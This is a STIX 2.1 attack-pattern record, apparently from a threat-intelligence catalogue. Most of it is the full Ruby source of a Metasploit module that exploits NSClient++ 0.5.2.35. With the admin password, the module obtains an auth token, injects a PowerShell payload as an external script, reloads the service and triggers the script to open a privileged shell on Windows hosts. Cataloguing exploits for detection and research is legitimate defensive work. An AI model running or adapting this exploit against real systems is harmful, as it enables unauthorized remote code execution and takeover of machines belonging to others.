{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--186ed6ea-5577-45a9-9fb3-a357d4411758",
    "created": "2024-08-14T16:53:45.027388Z",
    "modified": "2024-08-14T16:53:45.027392Z",
    "name": "NSClient++ 0.5.2.35 - ExternalScripts Authenticated Remote Code Execution",
    "description": " This module allows an attacker with knowledge of the admin password of NSClient++ to start a privilege shell. For this module to work, both web interface of NSClient++ and `ExternalScripts` feature should be enabled.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/nscp_authenticated_rce.rb",
            "external_id": "nscp_authenticated_rce.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include ::Msf::Exploit::Remote::HttpClient\n  include ::Msf::Exploit::CmdStager\n  include ::Msf::Exploit::Powershell\n  prepend ::Msf::Exploit::Remote::AutoCheck\n  include ::Rex::Text\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NSClient++ 0.5.2.35 - ExternalScripts Authenticated Remote Code Execution',\n        'Description' => %q{\n          This module allows an attacker with knowledge of the admin password of NSClient++\n          to start a privilege shell.\n          For this module to work, both web interface of NSClient++ and `ExternalScripts` feature\n          should be enabled.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'kindredsec', # POC on www.exploit-db.com\n          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module\n        ],\n        'References' => [\n          ['EDB', '48360']\n        ],\n        'Platform' => %w[windows],\n        'Arch' => [ARCH_X64],\n        'Targets' => [\n          [\n            'Windows',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :windows_powershell\n            }\n          ]\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2020-10-20',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ]\n        },\n        'DefaultOptions' => { 'SSL' => true }\n      )\n    )\n\n    register_options [\n      Opt::RPORT(8443),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with on NSClient web interface', nil])\n    ]\n  end\n\n  def configure_payload(token, cmd, key)\n    print_status('Configuring Script with Specified Payload . . .')\n\n    plugin_id = rand(1..10000).to_s\n\n    node = {\n      'path' => '/settings/external scripts/scripts',\n      'key' => key\n    }\n    value = { 'string_data' => cmd }\n    update = { 'node' => node, 'value' => value }\n    payload = [\n      {\n        'plugin_id' => plugin_id,\n        'update' => update\n      }\n    ]\n    json_data = { 'type' => 'SettingsRequestMessage', 'payload' => payload }\n\n    r = send_request_cgi({\n      'method' => 'POST',\n      'data' => JSON.generate(json_data),\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/settings/query.json')\n    })\n\n    if !(r&.body.to_s.include? 'STATUS_OK')\n      print_error('Error configuring payload. Hit error at: ' + endpoint)\n    end\n\n    print_status('Added External Script (name: ' + key + ')')\n    sleep(3)\n    print_status('Saving Configuration . . .')\n    header = { 'version' => '1' }\n    payload = [ { 'plugin_id' => plugin_id, 'control' => { 'command' => 'SAVE' } } ]\n    json_data = { 'header' => header, 'type' => 'SettingsRequestMessage', 'payload' => payload }\n\n    send_request_cgi({\n      'method' => 'POST',\n      'data' => JSON.generate(json_data),\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/settings/query.json')\n    })\n  end\n\n  def reload_config(token)\n    print_status('Reloading Application . . .')\n\n    send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/core/reload')\n    })\n\n    print_status('Waiting for Application to reload . . .')\n    sleep(10)\n    response = false\n    count = 0\n    until response\n      begin\n        sleep(2)\n        r = send_request_cgi({\n          'method' => 'GET',\n          'headers' => { 'TOKEN' => token },\n          'uri' => normalize_uri('/')\n        })\n        if !r.body.empty?\n          response = true\n        end\n      rescue StandardError\n        count += 1\n        if count > 10\n          fail_with(Failure::Unreachable, 'Application failed to reload. Nice DoS exploit!')\n        end\n      end\n    end\n  end\n\n  def trigger_payload(token, key)\n    print_status('Triggering payload, should execute shortly . . .')\n\n    send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri(\"/query/#{key}\")\n    })\n  rescue StandardError => e\n    print_error(\"Request could not be sent. #{e.class} error raised with message '#{e.message}'\")\n  end\n\n  def external_scripts_feature_enabled?(token)\n    r = send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'TOKEN' => token },\n      'uri' => normalize_uri('/registry/control/module/load'),\n      'vars_get' => { 'name' => 'CheckExternalScripts' }\n    })\n\n    r&.body.to_s.include? 'STATUS_OK'\n  end\n\n  def get_auth_token\n    r = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri('/auth/token?password=' + datastore['PASSWORD'])\n    })\n\n    if r.code == 200\n      begin\n        auth_token = r.body.to_s[/\"auth token\": \"(\\w*)\"/, 1]\n        return auth_token\n      rescue StandardError\n        :no_token_found\n      end\n    else\n      :wrong_password\n    end\n  rescue StandardError\n    :failed_to_connect\n  end\n\n  def check\n    token = get_auth_token\n\n    if token == :failed_to_connect\n      CheckCode::Safe(\"Can't access to NSClient web interface, maybe the web interface is not activated or something is wrong with the targeted host\")\n    elsif token == :wrong_password\n      CheckCode::Unknown('Unable to connect to NSClient web interface because the admin password given is wrong')\n    elsif token == :no_token_found\n      CheckCode::Unknown('Unable to get an authentication token, maybe the target is safe')\n    else\n      print_good('Got auth token: ' + token)\n      if external_scripts_feature_enabled?(token)\n        CheckCode::Vulnerable('External scripts feature enabled !')\n      else\n        CheckCode::Safe('External scripts feature disabled !')\n      end\n    end\n  end\n\n  def exploit\n    cmd = cmd_psh_payload(payload.encoded, payload.arch.first, remove_comspec: true)\n    token = get_auth_token\n\n    if token != :failed_to_connect && token != :wrong_password && token != :no_token_found\n      rand_key = rand_text_alpha_lower(10)\n      configure_payload(token, cmd, rand_key)\n      reload_config(token)\n      token = get_auth_token # reloading the app might imply the need to create a new auth token as the former could have been deleted\n      trigger_payload(token, rand_key)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-20",
    "x_mitre_platforms": [
        "%w[windows]"
    ]
}